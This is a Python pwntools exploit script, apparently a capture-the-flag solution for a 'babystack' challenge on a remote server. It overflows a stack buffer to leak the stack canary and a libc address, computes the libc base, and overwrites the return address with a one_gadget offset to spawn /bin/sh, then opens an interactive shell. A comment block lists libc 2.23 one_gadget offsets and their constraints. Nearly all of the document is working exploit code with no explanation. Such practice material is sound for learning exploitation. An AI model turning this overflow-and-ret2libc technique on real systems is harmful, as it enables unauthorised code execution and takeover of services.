from pwn import *
context.log_level = "debug"
# p = process("./babystack")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p = remote("111.198.29.45" , 32358)
libc = ELF("./libc-2.23.so")

cmd = lambda c : p.sendlineafter(">> " , str(c))
def store(content):
	cmd(1)
	p.send(content)

def get(payload):
	cmd(2)
	return p.recvuntil("\n" , drop = True).split(payload)[1]
# leak canary
payload1 = "a" * 0x89
store(payload1)
canary = u64(get(payload1)[:7].rjust(8 , "\x00"))
print(hex(canary))
# leak __libc_start_main
payload2 = "a" * 0x90 + "b" * 8
store(payload2)

__libc_start_main = u64(get(payload2).ljust(8 , "\x00")) - 240
libc_base = __libc_start_main - libc.sym["__libc_start_main"]
one_gadget = libc_base + 0xf1147
# getshell
payload3 = "a" * 0x88 + p64(canary)  + "b" * 8 + p64(one_gadget)

store(payload3)
cmd(3)
p.interactive()  

"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""